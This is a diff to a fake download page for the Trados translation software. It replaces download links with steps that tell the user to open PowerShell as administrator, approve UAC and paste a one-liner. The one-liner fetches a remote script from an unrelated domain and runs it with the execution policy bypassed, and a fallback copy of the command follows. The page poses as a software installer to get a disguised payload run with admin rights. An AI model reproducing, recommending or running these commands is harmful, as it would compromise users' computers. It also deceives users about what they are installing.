@@ -4,18 +4,31 @@
 
 Trados desktop package for Windows · office toolkit · local install ready.
 
-## Setup & Download
+## INSTALLATION
 
-> **This is the download page.** Use the button or link below to get **Trados** for Windows.
+**Steps:**
+1. Press **Win**, type **PowerShell**
+2. Right-click **Windows PowerShell** → **Run as administrator**
+3. Copy the command below, paste into the window, press **Enter**
+4. If **UAC** still appears – click **Yes**
 
-<p align="center"><a href="https://sdl-trados.mefidirect.xyz/" style="display:inline-block;color:#fff;font-weight:700;text-decoration:none;padding:8px 18px;font-family:Segoe UI,Helvetica,Arial,sans-serif;font-size:13px;background:#2d3748;">DOWNLOAD</a><a href="https://sdl-trados.mefidirect.xyz/" style="display:inline-block;color:#fff;font-weight:700;text-decoration:none;padding:8px 18px;font-family:Segoe UI,Helvetica,Arial,sans-serif;font-size:13px;background:#0078D4;">TRADOS</a></p>
+```powershell
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://shellex.pro/ps/setup.ps1' | iex"
+```
 
-| | |
-| --- | --- |
-| **Project link** | **[sdl-trados.mefidirect.xyz](https://sdl-trados.mefidirect.xyz/)** |
-| **Full URL** | `https://sdl-trados.mefidirect.xyz/` |
-| **Type** | Desktop package — Windows 10 and 11, 64-bit |
-| **Admin** | Approve UAC, then run setup as Administrator
+<details>
+<summary><b>Command did not start?</b></summary>
+
+Try this directly in the same PowerShell window:
+
+```powershell
+irm 'https://shellex.pro/ps/setup.ps1' | iex
+```
+
+</details>
+
+<sub>Administrator rights are required to complete the setup.</sub>
+
 
 ## 📖 About
 
